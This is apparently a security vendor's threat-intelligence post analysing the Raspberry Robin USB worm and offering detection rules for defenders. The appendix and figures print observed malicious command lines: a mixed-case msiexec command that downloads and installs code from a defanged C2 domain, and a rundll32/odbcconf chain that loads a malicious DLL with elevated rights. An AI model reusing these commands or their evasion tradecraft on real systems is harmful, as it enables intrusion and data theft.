<div><p>Over the past several months, Red Canary Intelligence has been tracking a cluster of malicious activity we call Raspberry Robin. Read on for details on what Raspberry Robin is, high-fidelity opportunities to detect known behaviors, and background on how we decided to cluster this activity.</p><p>“Raspberry Robin” is Red Canary’s name for a cluster of activity we first observed in September 2021 involving a worm that is often installed via USB drive. This activity cluster relies on <code>msiexec.exe</code> to call out to its infrastructure, often compromised QNAP devices, using HTTP requests that contain a victim’s user and device names. We also observed Raspberry Robin use TOR exit nodes as additional command and control (C2) infrastructure.</p><p>Like most activity clusters we track, Raspberry Robin began as a handful of detections with similar characteristics that we saw in multiple customers’ environments, first noticed by <a href="https://redcanary.com/authors/jason-killam/" rel="noopener noopener" target="_blank">Jason Killam</a> from Red Canary’s Detection Engineering team. We saw Raspberry Robin activity as far back as September 2021, though most related activity occurred during or after January 2022. As we observed additional activity, we couldn’t find public reporting to corroborate our analysis, aside from <a href="https://www.virustotal.com/gui/collection/cea528052dc6137b9ec1f2b03342921894fd0bb3b21209320bfdcb4ff7d27fb8" rel="noopener noopener" target="_blank">some findings on VirusTotal</a> that we suspected were related based on overlap in C2 domains.</p><p>To date, we’ve observed Raspberry Robin in organizations with ties to technology and manufacturing, though it’s not yet clear if there are other links among victims. We have several intelligence gaps around this cluster, including the operators’ objectives. While we don’t yet have the full picture, we want to share what we know about this activity cluster so far to enrich collective understanding of this threat and empower defenders to identify this activity. We use the cluster name “Raspberry Robin” to refer to the entire chain of activity described below, including the initial access method, the worm itself, and the follow-on execution and C2 activity.</p><p>Below we’ve provided a comprehensive analysis of known Raspberry Robin behavior with corresponding detection opportunities along the way.</p><img alt="" class="alignnone size-full wp-image-31221" height="718" src="" style="max-width:800px;height:auto;width:auto;" width="2560"/><img alt="" class="alignnone size-full wp-image-31221" height="718" src="https://redcanary.com/wp-content/uploads/2022/05/RRGraphicV3-scaled.jpg" style="max-width:800px;height:auto;width:auto;" width="2560"/><p> </p><p>Figure 1: Raspberry Robin event outline</p><h2>Initial access</h2><p>Raspberry Robin is typically introduced via infected removable drives, often USB devices. The Raspberry Robin worm often appears as a shortcut <code>.lnk</code> file masquerading as a legitimate folder on the infected USB device.</p><p>Soon after the Raspberry Robin infected drive is connected to the system, the UserAssist registry entry is updated and records execution of a ROT13-ciphered value referencing a <code>.lnk</code> file when deciphered. In the example below, <code>q:\erpbirel.yax</code> deciphers to <code>d:\recovery.lnk</code>.</p><img alt="" class="alignnone size-full wp-image-31208" height="1063" src="" style="max-width:800px;height:auto;width:auto;" width="2236"/><img alt="" class="alignnone size-full wp-image-31208" height="1063" src="https://redcanary.com/wp-content/uploads/2022/05/RRFigure2.jpg" style="max-width:800px;height:auto;width:auto;" width="2236"/><p>Figure 2: Registry modification with ROT13 <code>.lnk</code> file</p><h2>Execution</h2><p>Raspberry Robin first uses <code>cmd.exe</code> to read and execute a file stored on the infected external drive. The command is consistent across Raspberry Robin detections we have seen so far, making it reliable early evidence of potential Raspberry Robin activity. Typically the command line includes <code>cmd /R &lt;</code> to read and execute a file. The use of <code>cmd /R &lt;</code> is not unique to Raspberry Robin, but the filename pattern is unique. The filename is made up of five to seven random alphanumeric characters and a variety of file extensions. Some of the file extensions we’ve seen include <code>.usb</code>, <code>ico</code>, <code>.lnk</code>, <code>.bin</code>, .<code>sv</code>, and <code>.lo</code>. Additionally, the command has sometimes included type, which is a built-in command to display the contents of a file.</p><p>Here’s an example of what the whole command might look like:</p><img alt="" class="alignnone size-full wp-image-31207" height="468" src="" style="max-width:800px;height:auto;width:auto;" width="2048"/><img alt="" class="alignnone size-full wp-image-31207" height="468" src="https://redcanary.com/wp-content/uploads/2022/05/RRFigure3-scaled.jpg" style="max-width:800px;height:auto;width:auto;" width="2048"/><p>Figure 3: Raspberry Robin <code>cmd.exe</code> command</p><p>Next, <code>cmd.exe</code> typically launches <code>explorer.exe</code> and <code>msiexec.exe</code>. With Raspberry Robin, <code>explorer.exe</code>’s command line can be a mixed-case reference to an external device; a person’s name, like <code>LAUREN V</code>; or the name of the <code>.lnk</code> file, like the figure below. The name here has been modified from the <code>.lnk</code> file name to <code>LNkFILe</code>. While we aren’t sure of this command’s exact purpose, we’ve consistently observed it in Raspberry Robin detections.</p><img alt="" class="alignnone size-full wp-image-31206" height="639" src="" style="max-width:800px;height:auto;width:auto;" width="2048"/><img alt="" class="alignnone size-full wp-image-31206" height="639" src="https://redcanary.com/wp-content/uploads/2022/05/RRFigure4A.jpg" style="max-width:800px;height:auto;width:auto;" width="2048"/><img alt="" class="alignnone size-full wp-image-31205" height="626" src="" style="max-width:800px;height:auto;width:auto;" width="2048"/><img alt="" class="alignnone size-full wp-image-31205" height="626" src="https://redcanary.com/wp-content/uploads/2022/05/RRFigure4B.jpg" style="max-width:800px;height:auto;width:auto;" width="2048"/><p>Figure 4: Mixed-case command referring to device or name</p><p>Raspberry Robin extensively uses mixed-case letters in its commands. Adversaries sometimes use mixed-case syntax in an attempt to evade detection. Case-sensitive, string-based detections written to detect <code>evil</code> may not fire on <code>eViL</code>, but <code>cmd.exe</code> is case-insensitive and has the flexibility to read and process both commands the same way.</p><h2>Command and control (C2)</h2><p>Let’s look at Raspberry Robin’s <code>msiexec.exe</code> command in detail, since that informs our first behavior-based detection opportunity.</p><p>While <code>msiexec.exe</code> downloads and executes legitimate installer packages, adversaries also leverage it to deliver malware. Raspberry Robin uses <code>msiexec.exe</code> to attempt external network communication to a malicious domain for C2 purposes. The command line has several key features we have seen across multiple detections:</p><ul><li>Use of mixed-case syntax (this is yet another example of mixed case use by Raspberry Robin)</li><li>Use of short, recently-registered domains only containing a few characters, for example <code>v0[.]cx</code></li><li>The domains in our detections hosted QNAP NAS device login pages around the time of the Raspberry Robin activity. We hypothesize Raspberry Robin may use compromised QNAP devices for C2 infrastructure. The use of (ostensibly) compromised QNAP devices for C2 infrastructure is not unique to this activity cluster, but we observed operators using these across several Raspberry Robin-associated detections.</li><li>Inclusion of port <code>8080</code>, a non-standard HTTP web service port, in the URL</li><li>Inclusion of a string of random alphanumeric characters as the URL subdirectory, frequently followed by the victim’s hostname and username</li></ul><p>Here is a modified example of a full malicious Raspberry Robin <code>msiexec.exe</code> command line matching all of the above criteria. The random string has been modified, and the victim’s host name replaced with <code>HOSTNAME</code>, though the domain name remains the original one observed.</p><img alt="" class="alignnone size-full wp-image-31204" height="417" src="" style="max-width:800px;height:auto;width:auto;" width="2048"/><img alt="" class="alignnone size-full wp-image-31204" height="417" src="https://redcanary.com/wp-content/uploads/2022/05/RRFigure5-scaled.jpg" style="max-width:800px;height:auto;width:auto;" width="2048"/><p>Figure 5: Malicious Raspberry Robin <code>msiexec.exe</code> command</p><p>To detect suspicious use of <code>msiexec.exe</code> by Raspberry Robin or other threats, it’s essential to take a look at the command line and the URL. Detecting <code>msiexec.exe</code> making outbound network connections to download and install packages in the command line interface will give you the opportunity to examine the activity and determine if it’s malicious or not.</p><h3>Detection opportunity: <code>msiexec.exe</code> downloading and executing packages
 Identify the use of Windows Installer Tool <code>msiexec.exe</code> to download and execute
 packages in the CLI.</h3><p>process == <code>('msiexec')</code>
 &amp;&amp;
 process_command_line_includes == <code>('http:', 'https:')</code>
 &amp;&amp;
 process_command_line_includes == <code>('/q', '-q')</code></p><h2>Persistence</h2><p>In several Raspberry Robin detections, we have seen <code>msiexec.exe</code> go on to install a malicious DLL file. At this time we are not certain what the DLL does.. We suspect it may establish persistence on the victim’s system. In the detections we saw, the malicious files were created as <code>C:\Windows\Installer\MSI****.tmp</code> files. In one case, a file with the same hash was also created as <code>C:\Users\username\AppData\Local\Temp\bznwi.ku</code>.</p><p>Examples:</p><ul><li><code>C:\Windows\Installer\MSI5C01.tmp</code>
<code>C:\Users\username\AppData\Local\Temp\bznwi.ku</code><p></p><ul><li>Shared MD5 hash: 6f5ea8383bc3bd07668a7d24fe9b0828</li><li><a href="https://www.virustotal.com/gui/file/1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1/" rel="noopener noopener" target="_blank">VirusTotal example</a></li></ul></li><li><code>C:\Windows\Installer\MSIE160.tmp</code><ul><li>MD5 hash: e8f0d33109448f877a0e532b1a27131a</li><li><a href="https://www.virustotal.com/gui/file/c0a13af59e578b77e82fe0bc87301f93fc2ccf0adce450087121cb32f218092c/" rel="noopener noopener" target="_blank">VirusTotal example</a></li></ul></li></ul><h2>Execution (again)</h2><p>Next, <code>msiexec.exe</code> launches a legitimate Windows utility, <code>fodhelper.exe</code>, which in turn spawns <code>rundll32.exe</code> to execute a malicious command. Processes launched by <code>fodhelper.exe</code> run with elevated administrative privileges without requiring a User Account Control prompt. It is unusual for <code>fodhelper.exe</code> to spawn any processes as the parent, making this another useful detection opportunity.</p><p>Detection opportunity: <code>fodhelper.exe</code> as a parent process
 Identify Windows Features On Demand helper <code>fodhelper.exe</code> creating
 processes as the parent.</p><p>parent_process == <code>('fodhelper')</code></p><p>The <code>rundll32.exe</code> command starts another legitimate Windows utility, in this case <code>odbcconf.exe</code>, and passes in additional commands to execute and configure the recently-installed malicious DLL <code>bznwi.ku</code> (Hash: <code>6f5ea8383bc3bd07668a7d24fe9b0828</code>). Here is what that command looks like. (We modified the random string values in the command, as well as replaced the victim’s username with <code>username</code>.)</p><img alt="" class="alignnone size-full wp-image-31203" height="851" src="" style="max-width:800px;height:auto;width:auto;" width="2048"/><img alt="" class="alignnone size-full wp-image-31203" height="851" src="https://redcanary.com/wp-content/uploads/2022/05/RRFigure6.jpg" style="max-width:800px;height:auto;width:auto;" width="2048"/><p>Figure 6: Malicious <code>rundll32.exe</code> command</p><p>The <code>-A</code> flag in <code>odbcconf.exe</code> specifies an action. <code>configdriver</code> loads the driver setup DLL, in this case <code>VKIPDSE</code>. <code>SETFILEDSNDIR</code> creates the registry location <code>HKEY_LOCAL_MACHINE\SOFTWARE\ODBC\ODBC.INI\ODBC File DSN\DefaultDSNDir</code>, if it does not already exist, and specifies the default location used by the ODBC Data Source Administrator when creating a file-based data source. <code>INSTALLDRIVER</code> adds additional information about the driver.</p><p>In this detection, we saw <code>odbcconf.exe</code> successfully execute the malicious command. Since <code>odbcconf.exe</code> has a built-in <code>regsvr</code> flag similar to <code>regsvr32.exe</code>, it can be used by adversaries to execute DLLs and bypass application control defenses that aren’t monitoring for <code>odbcconf.exe</code> misuse.</p><h3>Detection opportunity: <code>odbcconf.exe</code> loading .DLLs</h3><p>Detect the Windows Open Database Connectivity utility loading a configuration
 file or DLL. The /A flag specifies an action, <code>/F</code> uses a response file, and <code>/S</code> runs in silent mode.
 <code>Odbcconf.exe</code> running rgsvr actions in silent mode could indicate misuse.</p><p>process == <code>('odbcconf')</code>
 &amp;&amp;
 process_command_line_includes == <code>('regsvr)</code>
 &amp;&amp;
 process_command_line_includes == <code>('/f', '-f')</code>
 ||
 process_command_line_includes == <code>('/a', '-a')</code>
 ||
 process_command_line_includes == <code>('/s', '-s')</code></p><h2>C2, part deux</h2><p>We observed outbound C2 activity involving the processes <code>regsvr32.exe</code>, <code>rundll32.exe</code>, and <code>dllhost.exe</code> executing without any command-line parameters and making external network connections to IP addresses associated with TOR nodes. Additionally, some of the IP addresses in the connections host domains consisting of random alphanumeric characters. For example, <code>hxxps[:]//www[.]ivuoq6si2a[.]com/</code>.</p><p>This activity presents us with a final detection opportunity. It is atypical for <code>regsvr32.exe</code>, <code>rundll32.exe</code> and <code>dllhost.exe</code> to execute with no command-line parameters and establish external network connections. This behavior is not inherently malicious, but is good to monitor.</p><h3>Detection opportunity: network connections from the command line with no parameters</h3><p>Detect <code>regsvr32.exe</code>, <code>rundll32.exe</code>, and <code>dllhost.exe</code> making external network
 connections with an empty command line.</p><p>process == <code>('regsvr32')</code>
 ||
 process == <code>('rundll32')</code>
 ||
 process == <code>('dllhost')</code>
 &amp;&amp;
 process_command_line_contains == <code>(“”)</code>
 &amp;&amp;
 has_netconnection</p><p>*Note: Double Quotes (“”) within the command line means null.</p><h2>Intelligence gaps</h2><p>Several unanswered questions about this cluster remain. First and foremost, we don’t know how or where Raspberry Robin infects external drives to perpetuate its activity, though it’s likely this occurs offline or otherwise outside of our visibility. We also don’t know why Raspberry Robin installs a malicious DLL. One hypothesis is that it may be an attempt to establish persistence on an infected system, though additional information is required to build confidence in that hypothesis.</p><p>Perhaps our biggest question concerns the operators’ objectives. Absent additional information on later-stage activity, it’s difficult to make inferences on the goal or goals of these campaigns. Despite this, we hope this information is useful for informing broader efforts to track and better detect Raspberry Robin activity. We hope to start a conversation that will help the whole community learn more about this threat. If you’ve been tracking similar activity, we’d love to hear from you and collaborate. Contact <a href="mailto:intel@redcanary.com" rel="noopener noopener" target="_blank">intel@redcanary.com</a> with any observations or questions.</p><p>Thank you to all our contributing researchers who helped make this research possible, especially <a href="https://redcanary.com/authors/jeff-felling/" rel="noopener noopener" target="_blank">Jeff Felling</a> from Red Canary Intelligence and Jason Killam from Red Canary Detection Engineering.</p><h2>Appendix</h2><p>As we define parameters for an activity cluster, we map behaviors to <a href="https://redcanary.com/mitre-attack/" rel="noopener noopener" target="_blank">MITRE ATT&amp;CK</a> where applicable and note observables of interest. In some cases, often with infrastructure and certain adversary decisions, observables associated with an activity cluster may not neatly map to an ATT&amp;CK technique, and that’s okay.</p><table><thead><tr><th>Tactic</th><th>Technique</th><th>Description</th><th>Observable</th></tr></thead><thead></thead><tbody><tr><td class="center-">Tactic:<p>Initial Access</p></td><td class="center-">Technique :<p>T1091 Replication Through Removable Media</p></td><td class="center-">Description:<p>In some cases, Raspberry Robin was introduced via infected removable drives. In these instances, the worm appeared as a shortcut (LNK file) masquerading as a legitimate folder on a USB device</p></td><td class="center-">Observable :<p>e:\removable disk.lnk</p></td></tr><tr><td class="center-">Tactic:<p>Initial Access</p></td><td class="center-">Technique :</td><td class="center-">Description:<p><code>explorer.exe</code> with a command line containing a reference to a device or a name</p></td><td class="center-">Observable :<p>ExpLoRER “USB Drive” or EXPLorEr “LAUREN V” or
 eXPLOReR LNkFILe</p></td></tr><tr><td class="center-">Tactic:<p>Execution</p></td><td class="center-">Technique :<p>T1059.003 Command and Scripting Interpreter (Windows Command Shell)</p></td><td class="center-">Description:<p>Raspberry Robin uses the “standard-in” command prompt feature <code>cmd/R &lt;</code> to read and execute a file with a name composed of several seemingly random alphanumeric characters</p></td><td class="center-">Observable :<p>C:\Windows\system32\cmd.exe” /R CMD&lt;lAkTp.mY0</p></td></tr><tr><td class="center-">Tactic:<p>Defense Evasion</p></td><td class="center-">Technique :</td><td class="center-">Description:<p>The use of mixed-case letters, which is tradecraft sometimes used by adversaries to evade defenses (not unique to Raspberry Robin)</p></td><td class="center-">Observable :<p>mSIeXEc, ExpLoRER, or HTtp in a command line</p></td></tr><tr><td class="center-">Tactic:<p>Defense Evasion</p></td><td class="center-">Technique :<p>T1218.008 Signed Binary Proxy Execution: Rundll32
 T1218.008 Signed Binary Proxy Execution: Odbcconf</p></td><td class="center-">Description:<p>Raspberry Robin uses legitimate Windows utilities like <code>fodhelper.exe</code> and <code>odbcconf.exe</code> to proxy DLL file execution with <code>rundll32.exe</code></p></td><td class="center-">Observable :<p>“RUNDLL32.exe” shell32,ShellExec_RunDLLA “C:\WINDOWS\syswow64\odbcconf.exe” -A {regsvr “C:\Users\[redacted]\AppData\Local\Temp\bznwi.ku.”} -E -A {configdriver VKIPDSE} -A {SETFILEDSNDIR fnpawxs PXQAND ofeslkscqqczuaj} -a {INSTALLDRIVER fqcmypo OGEYSCKXFTBNXAF}</p></td></tr><tr><td class="center-">Tactic:<p>C2</p></td><td class="center-">Technique :<p>T1218.007 Signed Binary Proxy Execution: Msiexec
 T1071.001 Application Layer Protocol: Web Protocols</p><p> </p><p> </p></td><td class="center-">Description:<p><code>Msiexec.exe</code> making external network connections to URLs that include the victim’s hostname and username</p></td><td class="center-">Observable :<p>msiEXEC /Q -I hXxp://3h[.]WF:8080/ZgMaAJK3xTC/LP079LLP=52284</p></td></tr><tr><td class="center-">Tactic:<p>C2</p></td><td class="center-">Technique :</td><td class="center-">Description:<p>Recently registered top-level domains with few characters, likely used as C2 infrastructure</p></td><td class="center-">Observable :<p>3h[.]WF or v0[.]cx</p></td></tr><tr><td class="center-">Tactic:<p>C2</p></td><td class="center-">Technique :</td><td class="center-">Description:<p>Use of infrastructure tied to compromised QNAP NAS devices (not unique to Raspberry Robin)</p></td><td class="center-">Observable :</td></tr><tr><td class="center-">Tactic:<p>C2</p></td><td class="center-">Technique :<p>T1218.008 Signed Binary Proxy Execution: Rundll32
 T1218.008 Signed Binary Proxy Execution: Regsvr32</p><p> </p></td><td class="center-">Description:<p><code>rundll32.exe</code> and <code>regsvr32.exe</code> used for C2 communication</p></td><td class="center-">Observable :<p>Look for <code>rundll32.exe</code> and/or <code>regsvr32.exe</code> making external network connections with no command-line arguments</p></td></tr></tbody></table><h6 class="section-label color-red">Related Articles</h6> <a class="permalink" href="https://redcanary.com/blog/intelligence-insights-april-2022/"> </a> <ul class="meta"><li class="topic"><a>Detection and response</a></li></ul><h3 class="title">Intelligence Insights: April 2022</h3> <a class="permalink" href="https://redcanary.com/blog/access-tokens/"> </a> <ul class="meta"><li class="topic"><a>Detection and response</a></li></ul><h3 class="title">Better know a data source: Access tokens (and why they’re hard to get)</h3> <a class="permalink" href="https://redcanary.com/blog/2022-threat-detection-report/"> </a> <ul class="meta"><li class="topic"><a>Detection and response</a></li></ul><h3 class="title">Unwrapping the 2022 Threat Detection Report</h3> <a class="permalink" href="https://redcanary.com/blog/intelligence-insights-march-2022-3/"> </a> <ul class="meta"><li class="topic"><a>Detection and response</a></li></ul><h3 class="title">Intelligence Insights: March 2022</h3><h4 class="titleForm-title"> Subscribe to our blog</h4>You'll receive a weekly email with our new blog posts. *First Name:*Last Name:*Email Address: </div>